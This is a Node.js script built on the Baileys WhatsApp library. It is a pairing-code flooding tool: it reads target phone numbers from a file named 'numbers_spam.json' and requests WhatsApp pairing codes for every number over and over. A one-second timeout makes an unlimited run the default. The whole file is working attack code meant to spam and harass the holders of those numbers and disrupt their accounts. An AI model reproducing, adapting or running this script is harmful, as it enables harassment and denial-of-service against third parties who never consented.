const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs').promises;

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

const question = (text) => new Promise((resolve) => rl.question(text, resolve));

async function fetchPhoneNumbers() {
    try {
        const data = await fs.readFile('numbers_spam.json', 'utf8');
        const jsonData = JSON.parse(data);
        return Object.values(jsonData).flat();
    } catch (error) {
        return [];
    }
}

async function processRequests(XeonBotInc, phoneNumbers, xeonCodes) {
    let requestCount = 0;
    while (xeonCodes === Infinity || requestCount < xeonCodes) {
        await Promise.all(phoneNumbers.map(async (number) => {
            if (xeonCodes !== Infinity && requestCount >= xeonCodes) return;
            try {
                await XeonBotInc.requestPairingCode(number);
                requestCount++;
            } catch (error) {
            }
        }));
    }
}

async function XeonProject() {
    const { state } = await useMultiFileAuthState('./session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        let xeonCodes;

        const choicePromise = question('Choose (1 for 100, 2 for 1000, 3 for unlimited): ');
        const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve('3'), 1000));
        const choice = await Promise.race([choicePromise, timeoutPromise]);

        switch (choice) {
            case '1':
                xeonCodes = 100;
                break;
            case '2':
                xeonCodes = 1000;
                break;
            case '3':
            case '':
                xeonCodes = Infinity;
                break;
            default:
                xeonCodes = Infinity;
                break;
        }

        const phoneNumbers = await fetchPhoneNumbers();
        await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
        console.log('Finished processing requests.');

        const updatedPhoneNumbers = await fetchPhoneNumbers();
        console.log('Processing all numbers in the file...');
        await processRequests(XeonBotInc, updatedPhoneNumbers, xeonCodes);

    } catch (error) {
        console.error(error);
    } finally {
        rl.close();
    }

    return XeonBotInc;
}

XeonProject();
